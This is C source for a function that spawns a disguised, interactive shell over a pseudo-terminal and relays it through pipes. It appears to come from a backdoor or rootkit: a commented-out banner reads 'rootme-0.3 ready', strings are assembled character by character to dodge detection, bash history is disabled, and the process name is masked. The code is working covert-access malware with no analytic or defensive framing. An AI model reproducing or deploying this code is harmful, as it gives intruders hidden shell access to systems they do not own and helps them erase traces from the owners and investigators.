void runshell_pty( int rd_pipe, int wr_pipe )
{
	/*
	char r_banner[17];
	r_banner[0] = 'r'; r_banner[ 8] = '.';
	r_banner[1] = 'o'; r_banner[ 9] = '3';
	r_banner[2] = 'o'; r_banner[10] = ' ';
	r_banner[3] = 't'; r_banner[11] = 'r';
	r_banner[4] = 'm'; r_banner[12] = 'e';
	r_banner[5] = 'e'; r_banner[13] = 'a';
	r_banner[6] = '-'; r_banner[14] = 'd';
	r_banner[7] = '0'; r_banner[15] = 'y';

	write( wr_pipe, r_banner, 16 );
	*/

    fd_set rfds;
    struct winsize ws;
    int pid, pty, tty, n;
    char *slave, *temp;
    char buffer[4096];

    /* request a pseudo-terminal */

#if defined LINUX || defined FREEBSD || defined OPENBSD || defined OSF

    if( openpty( &pty, &tty, NULL, NULL, NULL ) < 0 )
	{
        return;
	}

    if( ! ( slave = ttyname( tty ) ) )
	{
        return;
	}

#else
#if defined IRIX

    if( ! ( slave = _getpty( &pty, O_RDWR, 0622, 0 ) ) )
	{
        return;
	}

    if( ( tty = open( slave, O_RDWR | O_NOCTTY ) ) < 0 )
	{
        return;
	}

#else
#if defined CYGWIN || defined SUNOS || defined HPUX

    if( ( pty = open( "/dev/ptmx", O_RDWR | O_NOCTTY ) ) < 0 )
	{
        return;
	}

    if( grantpt( pty ) < 0 )
	{
        return;
	}

    if( unlockpt( pty ) < 0 )
	{
        return;
	}

    if( ! ( slave = ptsname( pty ) ) )
	{
        return;
	}

    if( ( tty = open( slave, O_RDWR | O_NOCTTY ) ) < 0 )
	{
        return;
	}

#if defined SUNOS || defined HPUX

    if( ioctl( tty, I_PUSH, "ptem" ) < 0 )
        return;

    if( ioctl( tty, I_PUSH, "ldterm" ) < 0 )
        return;

#if defined SUNOS

    if( ioctl( tty, I_PUSH, "ttcompat" ) < 0 )
        return;

#endif
#endif
#endif
#endif
#endif

    /* get the window size and TERM variable */

    memset( buffer, 0, sizeof( buffer ) );

    if( ( n = read( rd_pipe, buffer, 64 ) ) != 64 )
	{
        return;
	}

    ws.ws_row = ( (int) buffer[0] << 8 ) + (int) buffer[1];
    ws.ws_col = ( (int) buffer[2] << 8 ) + (int) buffer[3];

    ws.ws_xpixel = 0;
    ws.ws_ypixel = 0;

    if( ioctl( pty, TIOCSWINSZ, &ws ) < 0 )
	{
        return;
	}

    if( ! ( temp = (char *) malloc( 66 ) ) )
        return;

    temp[0] = 'T'; temp[3] = 'M';
    temp[1] = 'E'; temp[4] = '=';
    temp[2] = 'R';

    strncpy( temp + 5, buffer + 4, 61 );

    putenv( temp );

    /* fork to spawn a shell */

    if( ( pid = fork() ) < 0 )
	{
        return;
	}

    if( ! pid )
    {
        close( pty );

        if( setsid() < 0 )
            return;

        /* set controlling tty, to have job control */

#if defined LINUX || defined FREEBSD || defined OPENBSD || defined OSF

        if( ioctl( tty, TIOCSCTTY, NULL ) < 0 )
            return;

#else
#if defined CYGWIN || defined SUNOS || defined IRIX || defined HPUX

        {
            int fd = open( slave, O_RDWR );
            if( fd < 0 ) return;
            close( tty );
            tty = fd;
        }

#endif
#endif

        /* tty becomes stdin, stdout, stderr */

        dup2( tty, 0 );
        dup2( tty, 1 );
        dup2( tty, 2 );

        if( tty > 2 ) close( tty );

        /* just in case bash is run, kill the history file */

        if( ! ( temp = (char *) malloc( 10 ) ) )
            return;

        temp[0] = 'H'; temp[5] = 'I';
        temp[1] = 'I'; temp[6] = 'L';
        temp[2] = 'S'; temp[7] = 'E';
        temp[3] = 'T'; temp[8] = '=';
        temp[4] = 'F'; temp[9] = '\0';

        putenv( temp );

        /* set HOME to "/var/tmp" */

        if( ! ( temp = (char *) malloc( 14 ) ) )
            return;

        temp[0] = 'H'; temp[ 7] = 'a';
        temp[1] = 'O'; temp[ 8] = 'r';
        temp[2] = 'M'; temp[ 9] = '/';
        temp[3] = 'E'; temp[10] = 't';
        temp[4] = '='; temp[11] = 'm';
        temp[5] = '/'; temp[12] = 'p';
        temp[6] = 'v'; temp[13] = '\0';

        putenv( temp );
        chdir( temp + 5 );

        /* fire up the shell */

        buffer[0] = 'b'; buffer[2] = 's';
        buffer[1] = 'a'; buffer[3] = 'h';
        buffer[4] = '\0';
        execlp( buffer, HIDE_SHELL, (char *) 0 );

        buffer[0] = '/'; buffer[4] = '/';
        buffer[1] = 'b'; buffer[5] = 's';
        buffer[2] = 'i'; buffer[6] = 'h';
        buffer[3] = 'n'; buffer[7] = '\0';
        execlp( buffer, HIDE_SHELL, (char *) 0 );

        return;
    }

    /* tty (slave side) not needed anymore */

    close( tty );

    /* let's forward the data back and forth */

    while( 1 )
    {
        FD_ZERO( &rfds );
        FD_SET( rd_pipe, &rfds );
        FD_SET( pty, &rfds );

        n = ( pty > rd_pipe ) ? pty : rd_pipe;

        if( select( n + 1, &rfds, NULL, NULL, NULL ) < 0 )
            break;

        if( FD_ISSET( rd_pipe, &rfds ) )
        {
            n = read( rd_pipe, buffer, sizeof( buffer ) );

            if( n <= 0 ) break;

            if( write( pty, buffer, n ) != n )
                break;
        }

        if( FD_ISSET( pty, &rfds ) )
        {
            n = read( pty, buffer, sizeof( buffer ) );

            if( n <= 0 ) break;

            if( write( wr_pipe, buffer, n ) != n )
                break;
        }
    }
	kill(pid, 9);

	int status;
	wait(&status);

    return;
}